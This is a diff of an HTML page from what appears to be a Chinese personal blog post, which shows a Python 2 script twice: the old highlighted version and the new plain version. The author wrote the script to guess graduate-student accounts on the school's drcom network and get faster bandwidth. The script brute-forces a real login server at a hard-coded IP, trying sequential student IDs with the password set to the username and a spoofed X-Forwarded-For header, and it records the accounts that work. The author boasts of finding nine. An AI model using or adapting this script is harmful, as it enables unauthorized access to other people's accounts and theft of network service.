@@ -79,7 +79,7 @@
 	<h2 class="title">Python猜研究生账号</h2>
 	<div class="entry-content"><p>嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -171,99 +171,280 @@
 <span class='line-number'>90</span>
 <span class='line-number'>91</span>
 <span class='line-number'>92</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#! /usr/bin python</span>
-</span><span class='line'><span class="c"># encoding: utf-8</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+<span class='line-number'>143</span>
+<span class='line-number'>144</span>
+<span class='line-number'>145</span>
+<span class='line-number'>146</span>
+<span class='line-number'>147</span>
+<span class='line-number'>148</span>
+<span class='line-number'>149</span>
+<span class='line-number'>150</span>
+<span class='line-number'>151</span>
+<span class='line-number'>152</span>
+<span class='line-number'>153</span>
+<span class='line-number'>154</span>
+<span class='line-number'>155</span>
+<span class='line-number'>156</span>
+<span class='line-number'>157</span>
+<span class='line-number'>158</span>
+<span class='line-number'>159</span>
+<span class='line-number'>160</span>
+<span class='line-number'>161</span>
+<span class='line-number'>162</span>
+<span class='line-number'>163</span>
+<span class='line-number'>164</span>
+<span class='line-number'>165</span>
+<span class='line-number'>166</span>
+<span class='line-number'>167</span>
+<span class='line-number'>168</span>
+<span class='line-number'>169</span>
+<span class='line-number'>170</span>
+<span class='line-number'>171</span>
+<span class='line-number'>172</span>
+<span class='line-number'>173</span>
+<span class='line-number'>174</span>
+<span class='line-number'>175</span>
+<span class='line-number'>176</span>
+<span class='line-number'>177</span>
+<span class='line-number'>178</span>
+<span class='line-number'>179</span>
+<span class='line-number'>180</span>
+<span class='line-number'>181</span>
+<span class='line-number'>182</span>
+<span class='line-number'>183</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#! /usr/bin python
 </span><span class='line'>
-</span><span class='line'><span class="kn">import</span> <span class="nn">urllib2</span>
-</span><span class='line'><span class="kn">import</span> <span class="nn">urllib</span>
-</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
-</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
+</span><span class='line'># encoding: utf-8
 </span><span class='line'>
-</span><span class='line'><span class="n">guess_list</span> <span class="o">=</span> <span class="p">[]</span>
-</span><span class='line'><span class="n">server_url</span> <span class="o">=</span> <span class="s">&quot;http://222.174.155.19/&quot;</span>
-</span><span class='line'><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;User-Agent&#39;</span><span class="p">:</span><span class="s">&#39;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6&#39;</span><span class="p">,</span>
-</span><span class='line'><span class="s">&#39;X-Forwarded-For&#39;</span><span class="p">:</span><span class="s">&#39;1.1.1.1&#39;</span><span class="p">}</span>
 </span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
-</span><span class='line'><span class="k">print</span> <span class="s">&quot;USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat&quot;</span>
-</span><span class='line'><span class="k">print</span> <span class="s">&quot;USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396&quot;</span>
 </span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">Login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
-</span><span class='line'><span class="n">params</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span><span class="s">&#39;DDDDD&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s">&#39;upass&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span> <span class="s">&#39;0MKKey&#39;</span><span class="p">:</span> <span class="s">&quot;%B5%C7%C2%BC</span><span class="si">%20Lo</span><span class="s">gin&quot;</span><span class="p">})</span>
-</span><span class='line'><span class="n">request</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">server_url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">params</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">)</span>
-</span><span class='line'><span class="k">try</span><span class="p">:</span>
-</span><span class='line'><span class="n">output</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
-</span><span class='line'><span class="n">Log</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
-</span><span class='line'><span class="k">except</span><span class="p">:</span>
-</span><span class='line'><span class="k">print</span> <span class="s">&quot;timeout!&quot;</span>
-</span><span class='line'><span class="k">global</span> <span class="n">guess_list</span>
-</span><span class='line'><span class="n">guess_list</span> <span class="o">=</span> <span class="n">guess_list</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
-</span><span class='line'><span class="n">guess_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span><span class='line'>import urllib2
 </span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">Logout</span><span class="p">():</span>
-</span><span class='line'><span class="n">output</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">server_url</span> <span class="o">+</span> <span class="s">&quot;F.htm&quot;</span><span class="p">)</span>
+</span><span class='line'>import urllib
 </span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">Log</span><span class="p">(</span><span class="n">output</span><span class="p">,</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
-</span><span class='line'><span class="c"># &quot;msga=&#39;error1&#39;&quot; =&gt; can not login in web</span>
-</span><span class='line'><span class="n">result</span> <span class="o">=</span> <span class="n">output</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&quot;msga=&#39;error1&#39;&quot;</span><span class="p">)</span>
-</span><span class='line'><span class="k">if</span> <span class="n">result</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
-</span><span class='line'><span class="k">print</span> <span class="s">&quot;find one!!!&quot;</span>
-</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;./content.dat&quot;</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span>
-</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span class='line'><span class="k">else</span><span class="p">:</span>
-</span><span class='line'><span class="k">print</span> <span class="s">&quot;pass!&quot;</span>
-</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;./bad.dat&quot;</span><span class="p">,</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
-</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span class='line'><span class="c">#drop first element</span>
-</span><span class='line'><span class="k">global</span> <span class="n">guess_list</span>
-</span><span class='line'><span class="n">guess_list</span> <span class="o">=</span> <span class="n">guess_list</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+</span><span class='line'>import sys
 </span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">show_result</span><span class="p">():</span>
-</span><span class='line'><span class="k">print</span> <span class="s">&quot;Result:##########################################&quot;</span>
-</span><span class='line'><span class="k">print</span> <span class="s">&quot;Have Guessed:&quot;</span>
-</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;./content.dat&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
-</span><span class='line'><span class="k">print</span> <span class="n">i</span><span class="p">,</span>
-</span><span class='line'><span class="k">print</span> <span class="s">&quot;some accounts can not guessed are in bad.dat&quot;</span>
-</span><span class='line'><span class="k">print</span> <span class="s">&quot;Result:##########################################&quot;</span>
+</span><span class='line'>import types
 </span><span class='line'>
-</span><span class='line'><span class="k">def</span> <span class="nf">get_timeout_list</span><span class="p">(</span><span class="n">timeout_file_path</span><span class="p">):</span>
-</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">timeout_file_path</span><span class="p">)</span>
-</span><span class='line'><span class="k">global</span> <span class="n">guess_list</span>
-</span><span class='line'><span class="n">guess_list</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
-</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
-</span><span class='line'><span class="c"># itself and only one argv,the path of account list file...</span>
-</span><span class='line'><span class="n">get_timeout_list</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-</span><span class='line'><span class="k">elif</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">):</span>
-</span><span class='line'><span class="n">usage</span><span class="p">()</span>
-</span><span class='line'><span class="k">else</span><span class="p">:</span>
-</span><span class='line'><span class="c">#start and end account,argv[1] and argv[2]</span>
-</span><span class='line'><span class="n">start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-</span><span class='line'><span class="n">end</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
-</span><span class='line'><span class="k">if</span> <span class="n">start</span> <span class="o">&gt;</span> <span class="n">end</span><span class="p">:</span>
-</span><span class='line'><span class="n">usage</span><span class="p">()</span>
-</span><span class='line'><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-</span><span class='line'><span class="k">else</span><span class="p">:</span>
-</span><span class='line'><span class="n">guess_list</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
 </span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
+</span><span class='line'>guess_list = []
 </span><span class='line'>
-</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">guess_list</span><span class="p">:</span>
-</span><span class='line'><span class="c">#drop last \n or \r</span>
-</span><span class='line'><span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="n">types</span><span class="o">.</span><span class="n">StringType</span><span class="p">:</span>
-</span><span class='line'><span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n\r</span><span class="s">&#39;</span><span class="p">)</span>
-</span><span class='line'><span class="n">Logout</span><span class="p">()</span>
-</span><span class='line'><span class="k">print</span> <span class="s">&quot;Guess: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-</span><span class='line'><span class="n">Login</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span><span class='line'>server_url = "http://222.174.155.19/"
 </span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">guess_list</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-</span><span class='line'><span class="k">break</span>
-</span><span class='line'><span class="n">show_result</span><span class="p">()</span>
-</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
+</span><span class='line'>
+</span><span class='line'>'X-Forwarded-For':'1.1.1.1'}
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>def usage():
+</span><span class='line'>
+</span><span class='line'>print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
+</span><span class='line'>
+</span><span class='line'>print "USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396"
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>def Login(username, password):
+</span><span class='line'>
+</span><span class='line'>params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
+</span><span class='line'>
+</span><span class='line'>request = urllib2.Request(url = server_url, data = params, headers = headers)
+</span><span class='line'>
+</span><span class='line'>try:
+</span><span class='line'>
+</span><span class='line'>output = urllib2.urlopen(request, timeout = 3).readlines()
+</span><span class='line'>
+</span><span class='line'>Log(output[5], username, password)
+</span><span class='line'>
+</span><span class='line'>except:
+</span><span class='line'>
+</span><span class='line'>print "timeout!"
+</span><span class='line'>
+</span><span class='line'>global guess_list
+</span><span class='line'>
+</span><span class='line'>guess_list = guess_list[1:]
+</span><span class='line'>
+</span><span class='line'>guess_list.append(username)
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>def Logout():
+</span><span class='line'>
+</span><span class='line'>output = urllib2.urlopen(server_url + "F.htm")
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>def Log(output,username, password):
+</span><span class='line'>
+</span><span class='line'># "msga='error1'" => can not login in web
+</span><span class='line'>
+</span><span class='line'>result = output.find("msga='error1'")
+</span><span class='line'>
+</span><span class='line'>if result != -1:
+</span><span class='line'>
+</span><span class='line'>print "find one!!!"
+</span><span class='line'>
+</span><span class='line'>f = open("./content.dat", 'a')
+</span><span class='line'>
+</span><span class='line'>f.write(str(username) + '\n')
+</span><span class='line'>
+</span><span class='line'>f.close()
+</span><span class='line'>
+</span><span class='line'>else:
+</span><span class='line'>
+</span><span class='line'>print "pass!"
+</span><span class='line'>
+</span><span class='line'>f = open("./bad.dat",'a')
+</span><span class='line'>
+</span><span class='line'>f.write(str(username) + '\n')
+</span><span class='line'>
+</span><span class='line'>f.close()
+</span><span class='line'>
+</span><span class='line'>#drop first element
+</span><span class='line'>
+</span><span class='line'>global guess_list
+</span><span class='line'>
+</span><span class='line'>guess_list = guess_list[1:]
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>def show_result():
+</span><span class='line'>
+</span><span class='line'>print "Result:##########################################"
+</span><span class='line'>
+</span><span class='line'>print "Have Guessed:"
+</span><span class='line'>
+</span><span class='line'>for i in open("./content.dat").readlines():
+</span><span class='line'>
+</span><span class='line'>print i,
+</span><span class='line'>
+</span><span class='line'>print "some accounts can not guessed are in bad.dat"
+</span><span class='line'>
+</span><span class='line'>print "Result:##########################################"
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>def get_timeout_list(timeout_file_path):
+</span><span class='line'>
+</span><span class='line'>f = open(timeout_file_path)
+</span><span class='line'>
+</span><span class='line'>global guess_list 
+</span><span class='line'>
+</span><span class='line'>guess_list = f.readlines()
+</span><span class='line'>
+</span><span class='line'>f.close()
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>if len(sys.argv) == 2:
+</span><span class='line'>
+</span><span class='line'># itself and only one argv,the path of account list file...
+</span><span class='line'>
+</span><span class='line'>get_timeout_list(sys.argv[1])
+</span><span class='line'>
+</span><span class='line'>elif(len(sys.argv) &lt; 2):
+</span><span class='line'>
+</span><span class='line'>usage()
+</span><span class='line'>
+</span><span class='line'>else:
+</span><span class='line'>
+</span><span class='line'>#start and end account,argv[1] and argv[2]
+</span><span class='line'>
+</span><span class='line'>start = int(sys.argv[1])
+</span><span class='line'>
+</span><span class='line'>end = int(sys.argv[2])
+</span><span class='line'>
+</span><span class='line'>if start > end:
+</span><span class='line'>
+</span><span class='line'>usage()
+</span><span class='line'>
+</span><span class='line'>exit(-1)
+</span><span class='line'>
+</span><span class='line'>else:
+</span><span class='line'>
+</span><span class='line'>guess_list = range(start, end + 1)
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>if __name__ == "__main__":
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>while True:
+</span><span class='line'>
+</span><span class='line'>for i in guess_list:
+</span><span class='line'>
+</span><span class='line'>#drop last \n or \r
+</span><span class='line'>
+</span><span class='line'>if type(i) == types.StringType:
+</span><span class='line'>
+</span><span class='line'>i = i.rstrip('\n\r')
+</span><span class='line'>
+</span><span class='line'>Logout()
+</span><span class='line'>
+</span><span class='line'>print "Guess: " + str(i)
+</span><span class='line'>
+</span><span class='line'>Login(i, i)
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>if len(guess_list) == 0:
+</span><span class='line'>
+</span><span class='line'>break
+</span><span class='line'>
+</span><span class='line'>show_result()</span></code></pre></td></tr></table></div></figure>
 
 
 <p>主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga=&lsquo;error1&#8217;”字符串，当然严格来讲还得监测是不是有&#8221;Msg=0&#8221;这个字符串才好，我就省略了……</p>
